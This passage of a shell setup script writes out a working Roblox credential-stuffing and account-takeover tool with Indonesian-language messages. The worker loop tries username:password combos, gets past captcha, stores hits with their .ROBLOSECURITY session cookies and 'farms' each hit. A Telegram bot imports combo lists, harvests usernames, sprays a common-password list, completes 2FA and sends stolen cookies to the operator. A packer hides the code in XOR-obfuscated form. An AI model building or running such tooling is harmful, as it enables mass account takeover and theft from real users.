    def _handle_captcha(self, cli, u, p, detail):
        self._bump("captcha")
        if self.mode != "auto" and not self.breaker_tripped():
            return "captcha", detail, None
        if time.time() < self.warm_cool:
            return "captcha", detail, None
        token = self._try_warm(cli.challenge, u, p)
        if not token:
            self.warm_cool = time.time() + config.WARM_RETRY
            return "captcha", detail, None
        if not cli.continue_challenge(token):
            self.warm_cool = time.time() + config.WARM_RETRY
            return "captcha", detail, None
        st, det, ck = self._login(cli, u, p, cli.challenge_headers())
        if st == "captcha":
            self.warm_cool = time.time() + config.WARM_RETRY
            return st, det, ck
        with self.lock:
            self.recent.clear()
        self.warm_cool = 0.0
        try:
            store.retry_captcha(config.MAX_CAPTCHA_TRIES)
        except Exception:
            pass
        return st, det, ck

    def _farm(self, u, cookie):
        with self.farm_sem:
            try:
                farmer.collect(u, cookie)
            except Exception:
                pass

    def _run(self):
        cli = rblx.Roblox()
        try:
            cli.csrf()
        except Exception:
            pass
        while not self.stop.is_set():
            if self.paused:
                time.sleep(1.0)
                continue
            job = store.claim_combo()
            if not job:
                time.sleep(2.0)
                continue
            u, p = job["username"], job["password"]
            self.gate.wait()
            status, detail, cookie = self._login(cli, u, p)

            if status == "captcha":
                if self.warm_busy.is_set():
                    waited = 0.0
                    while (self.warm_busy.is_set() and not self.stop.is_set()
                           and waited < config.WARM_TIMEOUT):
                        time.sleep(0.5)
                        waited += 0.5
                    store.back_to_pending(u, p, "warm-wait")
                    continue
                status, detail, cookie = self._handle_captcha(cli, u, p, detail)
                if status == "captcha":
                    self._note("captcha")
                    store.mark_captcha(u, p, detail, config.CAPTCHA_DELAY)
                    self._bump("retry")
                    cli.reset()
                    continue

            self._note(status)

            if status in ("ratelimited", "csrf", "error", "blocked"):
                if status == "ratelimited":
                    try:
                        wait = min(300.0, float(detail) + 5)
                    except Exception:
                        wait = 60.0
                    self.gate.hold(wait)
                delay = {"error": config.RETRY_DELAY, "csrf": 5.0,
                         "ratelimited": 0.0, "blocked": config.RETRY_DELAY}[status]
                store.requeue(u, p, "%s %s" % (status, detail), delay,
                              config.MAX_ATTEMPTS)
                self._bump("retry")
                cli.reset(soft=True)
                continue

            if status in ("hit", "2fa"):
                store.add_hit(u, p, cookie, "" if status == "hit" else "2fa")
                store.finish_combo(u, p, status, detail)
                if status == "2fa" and cli.challenge and cli.challenge.get("id"):
                    store.set_state("2fa:%s" % u, json.dumps({
                        "id": cli.challenge.get("id"),
                        "type": cli.challenge.get("type"),
                        "meta": cli.challenge.get("meta") or {}}))
                self._bump("hit")
                if cookie:
                    threading.Thread(target=self._farm, args=(u, cookie),
                                     daemon=True).start()
                cli.reset(soft=True)
            elif status == "invalid":
                if store.soft_count() or self.breaker_tripped():
                    store.mark_soft(u, p, detail)
                else:
                    store.finish_combo(u, p, "invalid", detail)
            else:
                store.finish_combo(u, p, status, detail)
            self._bump("done")
PY

w src/probe.py <<'PY'
import time

import config, rblx, util


def cap_probe():
    out = ["== captcha raw probe =="]
    s = util.Session(config.UA, 15)
    s.extra.update(rblx.BROWSER_HDR)
    s.probe_csrf(rblx.AUTH + "/v2/logout")
    code, hdr, text, js = s.request(
        "POST", rblx.AUTH + "/v2/login",
        {"ctype": "Username", "cvalue": "Roblox", "password": "dummy_%d" % int(time.time())})
    out.append("status : %s" % code)
    for k in ("rblx-challenge-id", "rblx-challenge-type", "rblx-challenge-metadata",
              "cf-mitigated", "content-type", "server"):
        v = hdr.get(k)
        out.append("%s: %s" % (k, str(v)[:300] if v else "-"))
    ch = rblx.parse_challenge(hdr)
    out.append("parsed id : %s" % ch.get("id"))
    out.append("parsed typ: %s" % ch.get("type"))
    out.append("meta keys : %s" % sorted((ch.get("meta") or {}).keys()))
    out.append("blob len  : %d" % len(ch.get("blob") or ""))
    out.append("publickey : %s" % (ch.get("public_key") or "-"))
    out.append("body      : %s" % (text or "")[:300].replace("\n", " "))
    return "\n".join(out)


def main():
    out = ["== probe endpoint =="]
    for ua in rblx.UAS:
        s = util.Session(ua, 15)
        s.extra.update(rblx.BROWSER_HDR)
        code, hdr, text, js = s.request("GET", rblx.AUTH + "/v2/login")
        out.append("csrf %-45s -> %s token=%s" % (ua[:45], code,
                                                  bool(hdr.get("x-csrf-token"))))
    out.append("")
    out.append(cap_probe())
    return "\n".join(out)
PY

w src/doctor.py <<'PY'
import json, os, sys, time
import urllib.error, urllib.parse, urllib.request

import config, rblx, util

OUT = []


def say(t=""):
    print(t, flush=True)
    OUT.append(str(t))


def tg(method, **p):
    url = "https://api.telegram.org/bot%s/%s" % (config.BOT_TOKEN, method)
    data = urllib.parse.urlencode(p).encode() if p else None
    try:
        with urllib.request.urlopen(url, data=data, timeout=25) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"ok": False, "err": "http %s" % e.code}
    except Exception as e:
        return {"ok": False, "err": repr(e)}


def out_ip():
    for u in ("https://api.ipify.org?format=json", "https://ifconfig.me/all.json"):
        try:
            with urllib.request.urlopen(u, timeout=10) as r:
                j = json.loads(r.read().decode())
            return j.get("ip") or j.get("ip_addr") or "?"
        except Exception:
            pass
    return "?"


def tg_check():
    if not config.BOT_TOKEN:
        say("[FAIL] BOT_TOKEN kosong")
        return False
    me = tg("getMe")
    if not me.get("ok"):
        say("[FAIL] getMe -> %s" % me)
        say("       token ini BUKAN punya bot lu, atau udah di-revoke.")
        say("       @BotFather -> /mybots -> pilih bot -> API Token")
        return False
    say("[ OK ] token valid, bot = @%s" % (me.get("result") or {}).get("username"))
    up = tg("getUpdates", limit=5)
    chats = []
    for x in (up.get("result") or []):
        c = ((x.get("message") or {}).get("chat") or {})
        if c.get("id"):
            chats.append(c.get("id"))
    if chats:
        say("[info] chat antre: %s" % chats)
        if config.AUTO_OWNER and not config.OWNER_ID:
            say("[ OK ] AUTO_OWNER aktif -> chat %s bakal diadopsi" % chats[0])
    else:
        say("[info] belum ada pesan antre (kirim /start ke bot dulu)")
    if config.OWNER_ID:
        say("[ OK ] OWNER_ID=%s" % config.OWNER_ID)
        if chats and all(c != config.OWNER_ID for c in chats):
            say("[WARN] chat yang nge-chat (%s) != OWNER_ID" % chats)
    return True


def net_check():
    say("[info] outbound IP: %s" % out_ip())
    s = util.Session(config.UA, 15)
    s.extra.update(rblx.BROWSER_HDR)
    code, hdr, text, js = s.request("GET", "https://users.roblox.com/v1/users/1")
    say("[%s] users/1 -> %s" % (" OK " if code == 200 else "FAIL", code))
    return code == 200


def fp_check():
    profiles = [("minimal", dict(rblx.BROWSER_HDR)),
                ("browser+sec", dict(rblx.BROWSER_HDR, **rblx.SEC_HDR))]
    uas = ["Roblox/WinInet", rblx.UAS[2]]
    best = None
    for pname, extra in profiles:
        for ua in uas:
            s = util.Session(ua, 20)
            s.extra.update(extra)
            s.probe_csrf(rblx.AUTH + "/v2/logout")
            code, hdr, text, js = s.request(
                "POST", rblx.AUTH + "/v2/login",
                {"ctype": "Username", "cvalue": "Roblox", "password": "dummy_1"})
            st, det = rblx.classify(code, hdr, js, text)
            say("[%-18s] -> %s %s | ct=%s" % (pname + "/" + ua[:10], code, st,
                                              (hdr.get("content-type") or "-")[:22]))
            if st in ("invalid", "csrf", "captcha", "ratelimited", "2fa"):
                best = best or ("%s/%s" % (pname, ua[:10]))
            if st in ("blocked", "denied") or code == 0:
                say("        body: %s" % (text or "")[:180].replace("\n", " "))
            time.sleep(0.8)
    say("[%s] fingerprint: %s" % (" OK " if best else "FAIL", best or "gak ada yang nembus"))
    return best is not None


def preflight():
    say("=" * 46)
    say(" svc doctor")
    say("=" * 46)
    say(config.describe())
    say("-" * 46)
    a = tg_check()
    say("-" * 46)
    b = net_check()
    say("-" * 46)
    c = fp_check()
    say("-" * 46)
    for p in config.problems():
        say("[WARN] %s" % p)
    say("HASIL: %s" % ("SIAP" if (a and b) else "ADA MASALAH"))
    say("=" * 46)
    try:
        os.makedirs(os.path.join(config.BASE, "out"), exist_ok=True)
        with open(os.path.join(config.BASE, "out", "doctor.txt"), "w",
                  encoding="utf-8") as f:
            f.write("\n".join(OUT) + "\n")
    except Exception:
        pass
    return a and b
PY

w src/bot.py <<'PY'
import json, logging, os, subprocess, threading, time
import urllib.error, urllib.parse, urllib.request

import backup, config, gencombo, harvest, probe, store

log = logging.getLogger("svc.tg")


def tg(token, method, params=None, timeout=60):
    url = "https://api.telegram.org/bot%s/%s" % (token, method)
    data = urllib.parse.urlencode(params or {}).encode()
    req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode()
            log.warning("tg %s -> HTTP %s %s", method, e.code, body[:200])
            return json.loads(body)
        except Exception:
            return None
    except Exception as e:
        log.warning("tg %s err: %r", method, e)
        return None


HELP = """svc
/doctor - cek token, owner, IP, header, csrf, login
/owner [id] - lihat/set owner
/probe - cek endpoint & UA
/capraw - dump header captcha mentah
/cap [n] - status captcha + daftar
/mode auto|blast - auto=solve captcha, blast=lewatin
/warm [token] - status warm / kirim token manual
/retrycaptcha - balikin combo captcha ke antrian
/retryinvalid - balikin combo 'soft' ke antrian
/soft - jumlah combo soft
/2fa <user> <kode> - selesain 2FA
/harvest [start] [count] - panen username by ID
/users - jumlah akun terkumpul
/gen spray|deep [pwlimit] [userlimit] [cap] - rakit combo
/check on|off - mulai/stop checker
/status - progress
/hits [n] /hit <user> /cookie <user>
/dead [n] /retry /reset
/backup /restore /pw [n] /log [n] /update
kirim file .txt - auto: ada ':' = combo, tanpa ':' = password
kalau ada WARM NEEDED, balas tokennya langsung ke chat ini"""


class Bot:
    def __init__(self, token, owner, stop, pool):
        self.token, self.owner, self.stop, self.pool = token, owner, stop, pool
        self.offset = int(store.get_state("tg_offset") or 0)
        self.chat = owner or 0

    def set_owner(self, chat):
        self.owner = chat
        self.chat = chat
        try:
            with open(config.OWNER_FILE, "w") as f:
                f.write(str(chat))
        except Exception:
            pass
        log.info("owner di-set ke %s", chat)

    def send(self, text):
        text = str(text)
        for i in range(0, max(1, len(text)), 3900):
            r = tg(self.token, "sendMessage",
                   {"chat_id": self.chat, "text": text[i:i + 3900],
                    "disable_web_page_preview": "true"})
            if r and not r.get("ok"):
                log.warning("send gagal: %s", str(r)[:200])
            time.sleep(0.25)

    def run(self):
        while not self.stop.is_set():
            js = tg(self.token, "getUpdates",
                    {"offset": self.offset, "timeout": 50,
                     "allowed_updates": json.dumps(["message"])}, timeout=70)
            if not js or not js.get("ok"):
                log.warning("getUpdates gagal: %s", str(js)[:200])
                time.sleep(3)
                continue
            for upd in js.get("result", []):
                self.offset = upd["update_id"] + 1
                store.set_state("tg_offset", self.offset)
                try:
                    self.handle(upd)
                except Exception as e:
                    log.warning("handle err: %r", e)
                    self.send("err: %r" % e)

    def handle(self, upd):
        m = upd.get("message") or {}
        chat = (m.get("chat") or {}).get("id")
        if chat is None or (m.get("chat") or {}).get("type") != "private":
            return
        if self.owner and chat != self.owner and not config.AUTO_OWNER:
            log.info("abaikan chat %s (owner %s)", chat, self.owner)
            return
        if not self.owner:
            self.set_owner(chat)
            self.send("owner di-set ke %s. kirim /help" % chat)
        elif chat != self.owner:
            log.info("chat %s != owner %s (AUTO_OWNER)", chat, self.owner)
        self.chat = chat

        if m.get("document"):
            return self.import_doc(m["document"])

        text = (m.get("text") or "").strip()
        if not text.startswith("/"):
            if self.pool.warm_status() and len(text) > 8:
                return self.send("token %s" % ("diterima" if self.pool.submit_warm(text)
                                               else "gak kepake"))
            return

        a = text.split()
        c = a[0].split("@")[0].lower()
        arg = a[1:]

        if c in ("/start", "/help"):
            self.send(HELP)
        elif c == "/doctor":
            threading.Thread(target=self._doctor, daemon=True).start()
        elif c == "/owner":
            if arg:
                self.set_owner(int(arg[0]))
            self.send("owner=%s chat=%s auto=%s" % (self.owner, self.chat, config.AUTO_OWNER))
        elif c == "/status":
            st = store.stats()
            self.send("users=%d hits=%d soft=%d\ncombos=%s\nchecker=%s mode=%s\n"
                      "captcha=%d rate=%.2f\nstats=%s" % (
                          st["users"], st["hits"], store.soft_count(), st["combos"],
                          "PAUSED" if self.pool.paused else "RUNNING", self.pool.mode,
                          store.captcha_count(), self.pool.captcha_rate(), self.pool.stats))
        elif c == "/capraw":
            threading.Thread(target=lambda: self.send(probe.cap_probe()), daemon=True).start()
        elif c == "/probe":
            threading.Thread(target=lambda: self.send(probe.main()), daemon=True).start()
        elif c == "/cap":
            self.send("captcha=%d rate=%.2f mode=%s\n%s" % (
                store.captcha_count(), self.pool.captcha_rate(), self.pool.mode,
                "\n".join(store.captcha_list(int(arg[0]) if arg else 15)) or "-"))
        elif c == "/mode":
            v = (arg[0] if arg else "").lower()
            self.send("mode -> %s" % self.pool.set_mode(v) if v in ("auto", "blast")
                      else "mode sekarang: %s" % self.pool.mode)
        elif c == "/warm":
            if arg:
                self.send("token %s" % ("diterima" if self.pool.submit_warm(arg[0])
                                        else "gak ada warm pending"))
            else:
                self.send("warm pending: %s | page: %s" % (self.pool.warm_status(),
                                                           config.WARM_PAGE))
        elif c == "/retrycaptcha":
            self.send("requeue %d" % store.retry_captcha(config.MAX_CAPTCHA_TRIES))
        elif c == "/retryinvalid":
            self.send("retry %d" % store.retry_soft())
        elif c == "/soft":
            self.send("soft=%d" % store.soft_count())
        elif c == "/2fa":
            if len(arg) < 2:
                self.send("pakai: /2fa <user> <kode>")
            else:
                threading.Thread(target=self._do_2fa, args=(arg[0], arg[1]),
                                 daemon=True).start()
        elif c == "/users":
            self.send("akun: %d" % store.user_count())
        elif c == "/harvest":
            self._harvest(arg)
        elif c == "/gen":
            mode = arg[0] if arg else "spray"
            pw = int(arg[1]) if len(arg) > 1 else None
            us = int(arg[2]) if len(arg) > 2 else None
            cap = int(arg[3]) if len(arg) > 3 else None
            self.send("rakit combo... (%s)" % mode)
            n, nu, npw = gencombo.generate(mode, pw_limit=pw, user_limit=us, cap=cap)
            self.send("jadi %d combo (%d akun x %d password)" % (n, nu, npw))
        elif c == "/check":
            self.pool.paused = (arg[0] if arg else "off").lower() != "on"
            self.send("checker %s" % ("PAUSED" if self.pool.paused else "RUNNING"))
        elif c == "/hits":
            hs = store.hits(int(arg[0]) if arg else 20)
            self.send("\n".join("%s : %s%s" % (h["username"], h["password"],
                                               " [2FA]" if h.get("note") == "2fa" else "")
                                for h in hs) or "belum ada")
        elif c == "/hit":
            h = store.get_hit(arg[0]) if arg else None
            self.send("%s : %s\n%s" % (h["username"], h["password"],
                                       (h["data"] or "")[:3500]) if h else "gak ketemu")
        elif c == "/cookie":
            h = store.get_hit(arg[0]) if arg else None
            if not h:
                self.send("gak ketemu")
            elif not h.get("cookie"):
                self.send("%s : %s\ncookie kosong (2FA?)" % (h["username"], h["password"]))
            else:
                self.send("%s : %s\n\n.ROBLOSECURITY=%s" % (h["username"], h["password"],
                                                            h["cookie"]))
        elif c == "/dead":
            self.send("dead=%d\n%s" % (store.stats()["combos"].get("dead", 0),
                                       "\n".join(store.dead_list(int(arg[0]) if arg else 15))))
        elif c == "/retry":
            self.send("retry %d" % store.retry_dead())
        elif c == "/reset":
            store.reset_running()
            self.send("ok")
        elif c == "/backup":
            self.send("backup: %s" % backup.run())
        elif c == "/restore":
            try:
                self.send("restore %d hits" % backup.restore())
            except Exception as e:
                self.send("restore err: %r" % e)
        elif c == "/pw":
            self.send("\n".join(gencombo.load_passwords()[:int(arg[0]) if arg else 10]) or "kosong")
        elif c == "/log":
            try:
                with open(config.LOG_PATH, encoding="utf-8") as f:
                    self.send("".join(f.readlines()[-int(arg[0]) if arg else -40:])[-3800:] or "kosong")
            except Exception as e:
                self.send("log err: %r" % e)
        elif c == "/update":
            threading.Thread(target=self._update, daemon=True).start()
        else:
            self.send(HELP)

    def _doctor(self):
        import doctor
        ok = doctor.preflight()
        self.send("\n".join(doctor.OUT[-60:]))
        self.send("doctor: %s" % ("SIAP" if ok else "ADA MASALAH"))

    def _update(self):
        try:
            r = subprocess.run(["git", "-C", config.BASE, "pull", "--ff-only"],
                               capture_output=True, text=True, timeout=60)
            self.send("update rc=%s\n%s" % (r.returncode, (r.stdout + r.stderr)[-1500:]))
        except Exception as e:
            self.send("update err: %r" % e)

    def _harvest(self, arg):
        start = int(arg[0]) if arg else 1
        count = int(arg[1]) if len(arg) > 1 else 1000
        self.send("panen ID %d..%d" % (start, start + count))
        threading.Thread(target=lambda: self.send("selesai, %d akun baru" %
                                                 harvest.run(start, count, self.stop)),
                         daemon=True).start()

    def _do_2fa(self, user, code):
        import rblx
        raw = store.get_state("2fa:%s" % user.lower())
        h = store.get_hit(user)
        if not raw or not h:
            return self.send("gak ada challenge 2FA buat %s" % user)
        ch = json.loads(raw)
        cli = rblx.Roblox()
        cli.challenge = {"id": ch.get("id"), "type": ch.get("type") or
                         "twostepverification", "meta": ch.get("meta") or {},
                         "token": None, "meta_solved": None}
        st, det, ck = cli.login_2fa(user, h["password"], code, cli.challenge)
        if st == "hit" and ck:
            store.update_hit_cookie(user, ck, "")
            self.send("2FA OK: %s" % user)
        else:
            self.send("2FA gagal: %s %s" % (st, det))

    def import_doc(self, doc):
        fi = tg(self.token, "getFile", {"file_id": doc["file_id"]})
        if not fi or not fi.get("ok"):
            return self.send("gagal ambil file")
        url = "https://api.telegram.org/file/bot%s/%s" % (self.token,
                                                          fi["result"]["file_path"])
        raw = urllib.request.urlopen(url, timeout=120).read().decode("utf-8", "replace")
        lines = raw.splitlines()
        if any(":" in ln for ln in lines[:50]):
            rows, now, seen = [], time.time(), set()
            for line in lines:
                line = line.strip()
                if ":" not in line:
                    continue
                u, p = line.split(":", 1)
                u, p = u.strip().lower(), p.strip()
                if u and p and (u, p) not in seen:
                    seen.add((u, p))
                    rows.append((u, p, now))
            store.add_combos(rows)
            self.send("import %d combo" % len(rows))
        else:
            n = gencombo.save_passwords([ln.strip() for ln in lines if ln.strip()])
            self.send("import %d password" % n)
PY

w src/main.py <<'PY'
import logging, os, signal, threading, time

import backup, bot, config, doctor, store, worker

stop = threading.Event()


def setup_log():
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        handlers=[logging.FileHandler(config.LOG_PATH, encoding="utf-8"),
                  logging.StreamHandler()])


def main():
    setup_log()
    log = logging.getLogger("svc")

    if config.DOCTOR:
        try:
            ok = doctor.preflight()
            if not ok and not config.FORCE:
                log.warning("doctor ada masalah -> SVC_FORCE=1 buat lanjut paksa")
        except Exception as e:
            log.warning("doctor error: %r", e)

    store.init(config.DB_PATH)
    store.set_shard(config.SHARD, config.SHARDS)

    if config.MODE == "worker":
        try:
            log.info("restore: %d hits", backup.restore())
        except Exception as e:
            log.warning("restore fail: %r", e)
        if not store.pending_count():
            try:
                import gencombo
                n, _, _ = gencombo.generate("spray")
                log.info("regen %d combo", n)
            except Exception as e:
                log.warning("regen fail: %r", e)

    store.reset_running()

    pool = worker.Pool(config.WORKERS, stop)
    if config.MODE == "worker":
        pool.paused = False
    pool.start()

    b = None
    if config.MODE != "worker" or os.environ.get("WORKER_BOT"):
        if config.BOT_TOKEN:
            owner = config.OWNER_ID
            if not owner:
                try:
                    with open(config.OWNER_FILE) as f:
                        owner = int(f.read().strip())
                except Exception:
                    owner = 0
            b = bot.Bot(config.BOT_TOKEN, owner, stop, pool)
            pool.notify = b.send
            threading.Thread(target=b.run, daemon=True).start()
            log.info("bot ON: %s... owner=%s auto=%s",
                     config.BOT_TOKEN[:12], owner or "(nunggu chat pertama)", config.AUTO_OWNER)
        else:
            log.warning("bot OFF: BOT_TOKEN kosong")

    def bg():
        while not stop.is_set():
            time.sleep(config.BACKUP_EVERY)
            try:
                backup.run()
            except Exception as e:
                log.warning("backup fail: %r", e)
    threading.Thread(target=bg, daemon=True).start()

    signal.signal(signal.SIGTERM, lambda *a: stop.set())
    signal.signal(signal.SIGINT, lambda *a: stop.set())

    if b:
        try:
            b.send("svc online | mode=%s workers=%d shard=%d/%d captcha=%s" % (
                config.MODE, config.WORKERS, config.SHARD, config.SHARDS, pool.mode))
            log.info("svc online terkirim")
        except Exception as e:
            log.warning("svc online gagal: %r", e)

    log.info("svc up mode=%s workers=%d shard=%d/%d captcha=%s",
             config.MODE, config.WORKERS, config.SHARD, config.SHARDS, pool.mode)

    t0 = time.time()
    while not stop.is_set():
        if config.DURATION and time.time() - t0 > config.DURATION:
            break
        time.sleep(1)
    stop.set()

    try:
        backup.run()
    except Exception:
        pass
    log.info("svc down")


if __name__ == "__main__":
    main()
PY

w src/pack.py <<'PY'
import base64, io, os, random, sys, zipfile, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE) if os.path.basename(HERE) in (".s", "src") else HERE
OUT = os.path.join(ROOT, "svc.py")
ENTRY = "main.py"
ENTRY_NAME = "app.py"
SKIP = {"pack.py", "svc.py"}

STUB = '''#!/usr/bin/env python3
import base64, compileall, hashlib, io, os, runpy, sys, zipfile, zlib

_K = {key!r}

_B = b"""
{body}
"""


def _load():
    k = _K
    raw = base64.b64decode(_B)
    return zlib.decompress(bytes(b ^ k[n % len(k)] for n, b in enumerate(raw)))


def main():
    os.environ["SVCHOME"] = os.path.dirname(os.path.abspath(__file__))
    blob = _load()
    h = hashlib.sha256(blob).hexdigest()[:16]
    d = os.path.join(os.path.expanduser("~"), ".cache", "svc-" + h)
    if not os.path.exists(os.path.join(d, ".ok")):
        os.makedirs(d, exist_ok=True)
        zipfile.ZipFile(io.BytesIO(blob)).extractall(d)
        try:
            compileall.compile_dir(d, quiet=2, legacy=True)
            for f in os.listdir(d):
                if f.endswith(".py") and os.path.exists(os.path.join(d, f + "c")):
                    os.remove(os.path.join(d, f))
        except Exception:
            pass
        open(os.path.join(d, ".ok"), "w").write("1")
    sys.path.insert(0, d)
    runpy.run_module("app", run_name="__main__")


if __name__ == "__main__":
    main()
'''


def read_env():
    p = os.path.join(ROOT, ".env")
    env = {}
    if os.path.exists(p):
        for line in open(p, encoding="utf-8"):
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                env[k.strip()] = v.strip().strip('"').strip("'")
    return env


def main():
    files = sorted(f for f in os.listdir(HERE)
                   if f.endswith(".py") and f not in SKIP)
    if ENTRY not in files:
        raise SystemExit("main.py gak ketemu di " + HERE)

    secret = {} if "--no-secret" in sys.argv else read_env()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for f in files:
            z.write(os.path.join(HERE, f), ENTRY_NAME if f == ENTRY else f)
        if secret:
            z.writestr("_secret.py", "_SECRET = " + repr(secret) + "\n")

    key = bytes(random.randrange(256) for _ in range(32))
    comp = zlib.compress(buf.getvalue(), 9)
    xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(comp))
    b64 = base64.b64encode(xored).decode()
    body = "\n".join(b64[i:i + 76] for i in range(0, len(b64), 76))

    with open(OUT, "w", encoding="utf-8") as fh:
        fh.write(STUB.format(key=key, body=body))
    os.chmod(OUT, 0o755)
    print("ok -> %s (%d KB)" % (OUT, os.path.getsize(OUT) // 1024))


main()
PY

w data/passwords.txt <<'TXT'
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
abc123
football
monkey
letmein
696969
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
roblox
roblox123
minecraft
gaming
assassin
liverpool
arsenal
madrid
barcelona
manutd
juventus
TXT

w .env.example <<'ENVF'
BOT_TOKEN=
OWNER_ID=
AUTO_OWNER=1
GITHUB_TOKEN=
GIST_ID=

USER_AGENT=Roblox/WinInet
HTTP_TIMEOUT=20
MIN_DELAY=1.1
MAX_DELAY=4.0
WORKERS=2
MAX_ATTEMPTS=3
RETRY_DELAY=20
CAPTCHA_DELAY=90
MAX_CAPTCHA_TRIES=5
BACKUP_EVERY=600
BACKUP_FULL=1
PROXY=

CAPTCHA_MODE=auto
WARM_TIMEOUT=300
WARM_RETRY=600
WARM_PAGE=https://adiprmx.github.io/svc/warm.html
CAPTCHA_BREAKER_WINDOW=10
CAPTCHA_BREAKER_RATE=0.5

ROTATE_UA=0
FARM_THREADS=4

SVC_SHARD=0
SVC_SHARDS=1
SVC_FORCE=0
ENVF

w .gitignore <<'GIT'
.env
svc.py
.s/
.d/
__pycache__/
*.pyc
*.log
data/.keepalive
GIT

echo "=== cek hasil ==="
for f in src/config.py src/util.py src/rblx.py src/store.py src/worker.py src/bot.py src/doctor.py src/main.py; do
  printf "%-18s %5s baris\n" "$f" "$(wc -l < "$f")"
done
echo
python3 - <<'PY'
import sys
sys.path.insert(0, "src")
import config, util, rblx, store, worker, bot, doctor, probe, harvest, backup, farmer, gencombo, pack
print("import semua modul: OK")
print(config.describe().splitlines()[0])
print("SVC_DOCTOR =", config.DOCTOR)
PY
